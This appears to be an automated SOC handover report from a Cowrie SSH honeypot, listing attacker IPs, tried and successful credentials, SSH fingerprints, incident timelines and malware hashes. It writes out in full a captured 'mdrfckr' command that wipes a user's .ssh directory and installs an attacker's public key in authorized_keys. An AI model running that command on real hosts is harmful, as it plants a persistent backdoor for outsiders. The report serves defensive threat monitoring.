# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-09 |
| **Generated At** | 2026-05-09T17:00:27Z |
| **Shift Time** | 17:00 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **343** |
| Confirmed Threats | **261** |
| False Positives Filtered | **82** (23.9%) |
| Unique Attacker IPs | **26** |
| Countries of Origin | **16** |
| High Severity Cases | **13** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **330** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **18** |
| Unique Credential Pairs | **7** |
| Unique Usernames | **4** |
| Unique Passwords | **7** |
| Successful Auth Pairs | **5** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 13 |
| `admin` | 2 |
| `345gs5662d34` | 2 |
| `tmpuser` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `toor` | 9 |
| `admin` | 2 |
| `345gs5662d34` | 2 |
| `3245gs5662d34` | 2 |
| `Qwer@123456` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `toor` | 9 |
| `admin` | `admin` | 2 |
| `345gs5662d34` | `345gs5662d34` | 2 |
| `root` | `3245gs5662d34` | 2 |
| `root` | `Qwer@123456` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `toor` | `185.71.233.73` | 2026-05-09T14:56:11 |
| `root` | `Qwer@123456` | `155.4.244.107` | 2026-05-09T16:28:41 |
| `root` | `3245gs5662d34` | `155.4.244.107` | 2026-05-09T16:28:47 |
| `root` | `root@admin123` | `111.68.98.152` | 2026-05-09T16:55:35 |
| `root` | `3245gs5662d34` | `111.68.98.152` | 2026-05-09T16:55:39 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **343** |
| Sessions with Fingerprint | **4** |
| Unique HASSH Fingerprints | **4** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 15 |
| Unknown | 10 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `748f8c627d3f...` | Mirai/variant | 10 | 1 |
| `03a80b21afa8...` | Modern SSH client | 8 | 2 |
| `af8223ac9914...` | libssh-based | 6 | 2 |
| `14b2ddda386a...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `748f8c627d3f...` | Unknown | 10 | 1 | Mirai/variant |
| `03a80b21afa8...` | libssh | 8 | 2 | Modern SSH client |
| `af8223ac9914...` | libssh | 6 | 2 | libssh-based |
| `14b2ddda386a...` | libssh | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 2 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `155.4.244.107`, `111.68.98.152`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **26** |
| Unique ASNs | **25** |
| High-Risk ASNs | **12** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS12975` | PALTEL Autonomous System | 1 | LOW |
| `AS37190` | Atlantique Telecom (Cote d'Ivoire) | 1 | LOW |
| `AS19318` | Interserver, Inc | 1 | HIGH |
| `AS4134` | CHINANET BACKBONE | 1 | LOW |
| `AS135161` | GMO-Z com NetDesign Holdings Co., Ltd. | 1 | HIGH |
| `AS133982` | Excitel Broadband Private Limited | 1 | LOW |
| `AS14061` | DigitalOcean, LLC | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (13)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-bb3e8994ca2e

| Field | Detail |
|---|---|
| **Source IP** | `185.71.233[.]73` |
| **First Seen** | 2026-05-09 14:56 |
| **Last Seen** | 2026-05-09 14:56 |
| **Session Duration** | 36s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `apt-get update -y, sudo apt-get update -y, toor` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-09 14:56:10` | `cowrie.session.connect` |
| `2026-05-09 14:56:10` | `cowrie.client.version` |
| `2026-05-09 14:56:10` | `cowrie.client.kex` |
| `2026-05-09 14:56:11` | `cowrie.login.success` |
| `2026-05-09 14:56:11` | `cowrie.client.size` |
| `2026-05-09 14:56:12` | `cowrie.session.params` |
| `2026-05-09 14:56:13` | `cowrie.command.input` |
| `2026-05-09 14:56:29` | `cowrie.command.input` |
| `2026-05-09 14:56:30` | `cowrie.command.input` |
| `2026-05-09 14:56:30` | `cowrie.command.failed` |
| `2026-05-09 14:56:46` | `cowrie.log.closed` |
| `2026-05-09 14:56:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.71.233[.]73` to AbuseIPDB if not already reported
- [ ] Block `185.71.233[.]73` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a85fee59265

| Field | Detail |
|---|---|
| **Source IP** | `185.71.233[.]73` |
| **First Seen** | 2026-05-09 15:13 |
| **Last Seen** | 2026-05-09 15:13 |
| **Session Duration** | 37s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `apt-get update -y, sudo apt-get update -y, toor` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-09 15:13:16` | `cowrie.session.connect` |
| `2026-05-09 15:13:16` | `cowrie.client.version` |
| `2026-05-09 15:13:16` | `cowrie.client.kex` |
| `2026-05-09 15:13:17` | `cowrie.login.success` |
| `2026-05-09 15:13:18` | `cowrie.client.size` |
| `2026-05-09 15:13:18` | `cowrie.session.params` |
| `2026-05-09 15:13:20` | `cowrie.command.input` |
| `2026-05-09 15:13:36` | `cowrie.command.input` |
| `2026-05-09 15:13:37` | `cowrie.command.input` |
| `2026-05-09 15:13:37` | `cowrie.command.failed` |
| `2026-05-09 15:13:53` | `cowrie.log.closed` |
| `2026-05-09 15:13:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.71.233[.]73` to AbuseIPDB if not already reported
- [ ] Block `185.71.233[.]73` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac32ee69cf59

| Field | Detail |
|---|---|
| **Source IP** | `185.71.233[.]73` |
| **First Seen** | 2026-05-09 15:27 |
| **Last Seen** | 2026-05-09 15:28 |
| **Session Duration** | 37s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `apt-get update -y, sudo apt-get update -y, toor` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-09 15:27:38` | `cowrie.session.connect` |
| `2026-05-09 15:27:38` | `cowrie.client.version` |
| `2026-05-09 15:27:38` | `cowrie.client.kex` |
| `2026-05-09 15:27:39` | `cowrie.login.success` |
| `2026-05-09 15:27:40` | `cowrie.client.size` |
| `2026-05-09 15:27:40` | `cowrie.session.params` |
| `2026-05-09 15:27:42` | `cowrie.command.input` |
| `2026-05-09 15:27:58` | `cowrie.command.input` |
| `2026-05-09 15:27:59` | `cowrie.command.input` |
| `2026-05-09 15:27:59` | `cowrie.command.failed` |
| `2026-05-09 15:28:15` | `cowrie.log.closed` |
| `2026-05-09 15:28:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.71.233[.]73` to AbuseIPDB if not already reported
- [ ] Block `185.71.233[.]73` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-edd1c28b27b1

| Field | Detail |
|---|---|
| **Source IP** | `185.71.233[.]73` |
| **First Seen** | 2026-05-09 15:33 |
| **Last Seen** | 2026-05-09 15:34 |
| **Session Duration** | 37s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `apt-get update -y, sudo apt-get update -y, toor` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-09 15:33:56` | `cowrie.session.connect` |
| `2026-05-09 15:33:56` | `cowrie.client.version` |
| `2026-05-09 15:33:56` | `cowrie.client.kex` |
| `2026-05-09 15:33:57` | `cowrie.login.success` |
| `2026-05-09 15:33:58` | `cowrie.client.size` |
| `2026-05-09 15:33:58` | `cowrie.session.params` |
| `2026-05-09 15:34:00` | `cowrie.command.input` |
| `2026-05-09 15:34:16` | `cowrie.command.input` |
| `2026-05-09 15:34:17` | `cowrie.command.input` |
| `2026-05-09 15:34:17` | `cowrie.command.failed` |
| `2026-05-09 15:34:33` | `cowrie.log.closed` |
| `2026-05-09 15:34:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.71.233[.]73` to AbuseIPDB if not already reported
- [ ] Block `185.71.233[.]73` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-00b4569fc936

| Field | Detail |
|---|---|
| **Source IP** | `185.71.233[.]73` |
| **First Seen** | 2026-05-09 15:45 |
| **Last Seen** | 2026-05-09 15:46 |
| **Session Duration** | 37s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `apt-get update -y, sudo apt-get update -y, toor` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-09 15:45:24` | `cowrie.session.connect` |
| `2026-05-09 15:45:24` | `cowrie.client.version` |
| `2026-05-09 15:45:24` | `cowrie.client.kex` |
| `2026-05-09 15:45:25` | `cowrie.login.success` |
| `2026-05-09 15:45:26` | `cowrie.client.size` |
| `2026-05-09 15:45:26` | `cowrie.session.params` |
| `2026-05-09 15:45:28` | `cowrie.command.input` |
| `2026-05-09 15:45:44` | `cowrie.command.input` |
| `2026-05-09 15:45:45` | `cowrie.command.input` |
| `2026-05-09 15:45:45` | `cowrie.command.failed` |
| `2026-05-09 15:46:01` | `cowrie.log.closed` |
| `2026-05-09 15:46:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.71.233[.]73` to AbuseIPDB if not already reported
- [ ] Block `185.71.233[.]73` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6078e2af946b

| Field | Detail |
|---|---|
| **Source IP** | `185.71.233[.]73` |
| **First Seen** | 2026-05-09 16:06 |
| **Last Seen** | 2026-05-09 16:07 |
| **Session Duration** | 38s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `apt-get update -y, sudo apt-get update -y, toor` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-09 16:06:44` | `cowrie.session.connect` |
| `2026-05-09 16:06:44` | `cowrie.client.version` |
| `2026-05-09 16:06:45` | `cowrie.client.kex` |
| `2026-05-09 16:06:46` | `cowrie.login.success` |
| `2026-05-09 16:06:47` | `cowrie.client.size` |
| `2026-05-09 16:06:48` | `cowrie.session.params` |
| `2026-05-09 16:06:49` | `cowrie.command.input` |
| `2026-05-09 16:07:05` | `cowrie.command.input` |
| `2026-05-09 16:07:06` | `cowrie.command.input` |
| `2026-05-09 16:07:06` | `cowrie.command.failed` |
| `2026-05-09 16:07:22` | `cowrie.log.closed` |
| `2026-05-09 16:07:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.71.233[.]73` to AbuseIPDB if not already reported
- [ ] Block `185.71.233[.]73` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f6c03006592

| Field | Detail |
|---|---|
| **Source IP** | `185.71.233[.]73` |
| **First Seen** | 2026-05-09 16:18 |
| **Last Seen** | 2026-05-09 16:18 |
| **Session Duration** | 36s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `apt-get update -y, sudo apt-get update -y, toor` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-09 16:18:11` | `cowrie.session.connect` |
| `2026-05-09 16:18:11` | `cowrie.client.version` |
| `2026-05-09 16:18:11` | `cowrie.client.kex` |
| `2026-05-09 16:18:12` | `cowrie.login.success` |
| `2026-05-09 16:18:12` | `cowrie.client.size` |
| `2026-05-09 16:18:13` | `cowrie.session.params` |
| `2026-05-09 16:18:14` | `cowrie.command.input` |
| `2026-05-09 16:18:30` | `cowrie.command.input` |
| `2026-05-09 16:18:31` | `cowrie.command.input` |
| `2026-05-09 16:18:31` | `cowrie.command.failed` |
| `2026-05-09 16:18:47` | `cowrie.log.closed` |
| `2026-05-09 16:18:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.71.233[.]73` to AbuseIPDB if not already reported
- [ ] Block `185.71.233[.]73` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-84e75e2433b4

| Field | Detail |
|---|---|
| **Source IP** | `155.4.244[.]107` |
| **First Seen** | 2026-05-09 16:28 |
| **Last Seen** | 2026-05-09 16:28 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-09 16:28:39` | `cowrie.session.connect` |
| `2026-05-09 16:28:39` | `cowrie.client.version` |
| `2026-05-09 16:28:40` | `cowrie.client.kex` |
| `2026-05-09 16:28:41` | `cowrie.login.success` |
| `2026-05-09 16:28:41` | `cowrie.session.params` |
| `2026-05-09 16:28:41` | `cowrie.command.input` |
| `2026-05-09 16:28:41` | `cowrie.command.failed` |
| `2026-05-09 16:28:42` | `cowrie.log.closed` |
| `2026-05-09 16:28:42` | `cowrie.session.params` |
| `2026-05-09 16:28:42` | `cowrie.command.input` |
| `2026-05-09 16:28:43` | `cowrie.session.file_download` |
| `2026-05-09 16:28:43` | `cowrie.log.closed` |
| `2026-05-09 16:28:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `155.4.244[.]107` to AbuseIPDB if not already reported
- [ ] Block `155.4.244[.]107` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-37bba80dda8f

| Field | Detail |
|---|---|
| **Source IP** | `155.4.244[.]107` |
| **First Seen** | 2026-05-09 16:28 |
| **Last Seen** | 2026-05-09 16:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-09 16:28:46` | `cowrie.session.connect` |
| `2026-05-09 16:28:46` | `cowrie.client.version` |
| `2026-05-09 16:28:46` | `cowrie.client.kex` |
| `2026-05-09 16:28:47` | `cowrie.login.success` |
| `2026-05-09 16:28:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `155.4.244[.]107` to AbuseIPDB if not already reported
- [ ] Block `155.4.244[.]107` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e11f40ee984a

| Field | Detail |
|---|---|
| **Source IP** | `185.71.233[.]73` |
| **First Seen** | 2026-05-09 16:28 |
| **Last Seen** | 2026-05-09 16:29 |
| **Session Duration** | 37s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `apt-get update -y, sudo apt-get update -y, toor` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-09 16:28:51` | `cowrie.session.connect` |
| `2026-05-09 16:28:51` | `cowrie.client.version` |
| `2026-05-09 16:28:51` | `cowrie.client.kex` |
| `2026-05-09 16:28:52` | `cowrie.login.success` |
| `2026-05-09 16:28:53` | `cowrie.client.size` |
| `2026-05-09 16:28:54` | `cowrie.session.params` |
| `2026-05-09 16:28:55` | `cowrie.command.input` |
| `2026-05-09 16:29:11` | `cowrie.command.input` |
| `2026-05-09 16:29:12` | `cowrie.command.input` |
| `2026-05-09 16:29:12` | `cowrie.command.failed` |
| `2026-05-09 16:29:28` | `cowrie.log.closed` |
| `2026-05-09 16:29:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.71.233[.]73` to AbuseIPDB if not already reported
- [ ] Block `185.71.233[.]73` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02abd90e4767

| Field | Detail |
|---|---|
| **Source IP** | `185.71.233[.]73` |
| **First Seen** | 2026-05-09 16:36 |
| **Last Seen** | 2026-05-09 16:37 |
| **Session Duration** | 37s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `apt-get update -y, sudo apt-get update -y, toor` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-09 16:36:35` | `cowrie.session.connect` |
| `2026-05-09 16:36:35` | `cowrie.client.version` |
| `2026-05-09 16:36:35` | `cowrie.client.kex` |
| `2026-05-09 16:36:37` | `cowrie.login.success` |
| `2026-05-09 16:36:37` | `cowrie.client.size` |
| `2026-05-09 16:36:38` | `cowrie.session.params` |
| `2026-05-09 16:36:39` | `cowrie.command.input` |
| `2026-05-09 16:36:55` | `cowrie.command.input` |
| `2026-05-09 16:36:56` | `cowrie.command.input` |
| `2026-05-09 16:36:56` | `cowrie.command.failed` |
| `2026-05-09 16:37:12` | `cowrie.log.closed` |
| `2026-05-09 16:37:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.71.233[.]73` to AbuseIPDB if not already reported
- [ ] Block `185.71.233[.]73` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a614deade6d7

| Field | Detail |
|---|---|
| **Source IP** | `111.68.98[.]152` |
| **First Seen** | 2026-05-09 16:55 |
| **Last Seen** | 2026-05-09 16:55 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-09 16:55:34` | `cowrie.session.connect` |
| `2026-05-09 16:55:34` | `cowrie.client.version` |
| `2026-05-09 16:55:34` | `cowrie.client.kex` |
| `2026-05-09 16:55:35` | `cowrie.login.success` |
| `2026-05-09 16:55:35` | `cowrie.session.params` |
| `2026-05-09 16:55:35` | `cowrie.command.input` |
| `2026-05-09 16:55:35` | `cowrie.command.failed` |
| `2026-05-09 16:55:35` | `cowrie.log.closed` |
| `2026-05-09 16:55:36` | `cowrie.session.params` |
| `2026-05-09 16:55:36` | `cowrie.command.input` |
| `2026-05-09 16:55:36` | `cowrie.session.file_download` |
| `2026-05-09 16:55:36` | `cowrie.log.closed` |
| `2026-05-09 16:55:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.68.98[.]152` to AbuseIPDB if not already reported
- [ ] Block `111.68.98[.]152` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-072626147529

| Field | Detail |
|---|---|
| **Source IP** | `111.68.98[.]152` |
| **First Seen** | 2026-05-09 16:55 |
| **Last Seen** | 2026-05-09 16:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-09 16:55:38` | `cowrie.session.connect` |
| `2026-05-09 16:55:38` | `cowrie.client.version` |
| `2026-05-09 16:55:39` | `cowrie.client.kex` |
| `2026-05-09 16:55:39` | `cowrie.login.success` |
| `2026-05-09 16:55:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.68.98[.]152` to AbuseIPDB if not already reported
- [ ] Block `111.68.98[.]152` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `206.183.111[.]36` | **203** | 2026-05-09 14:54 | 2026-05-09 16:53 | 115m | 0 | `T1592` | 🟠 MEDIUM |
| `150.95.25[.]34` | **18** | 2026-05-09 14:57 | 2026-05-09 16:54 | 15m | 0 | `T1592` | 🟠 MEDIUM |
| `135.232.182[.]226` | **12** | 2026-05-09 15:07 | 2026-05-09 16:40 | 7m | 0 | `T1592` | 🟠 MEDIUM |
| `14.103.84[.]166` | **7** | 2026-05-09 16:44 | 2026-05-09 16:57 | 9m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `106.75.127[.]184` | 1 | 2026-05-09 16:48 | 2026-05-09 16:50 | 120s | 0 | `T1592` | 🟢 LOW |
| `111.68.98[.]152` | 1 | 2026-05-09 16:55 | 2026-05-09 16:55 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `138.197.147[.]76` | 1 | 2026-05-09 16:39 | 2026-05-09 16:39 | 38s | 0 | `T1592` | 🟢 LOW |
| `155.4.244[.]107` | 1 | 2026-05-09 16:28 | 2026-05-09 16:28 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `185.71.233[.]73` | 1 | 2026-05-09 16:01 | 2026-05-09 16:01 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `190.95.224[.]198` | 1 | 2026-05-09 16:46 | 2026-05-09 16:48 | 120s | 0 | `T1592` | 🟢 LOW |
| `193.24.211[.]100` | 1 | 2026-05-09 15:22 | 2026-05-09 15:22 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `68.168.211[.]82` | 1 | 2026-05-09 15:05 | 2026-05-09 15:06 | 44s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 41/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
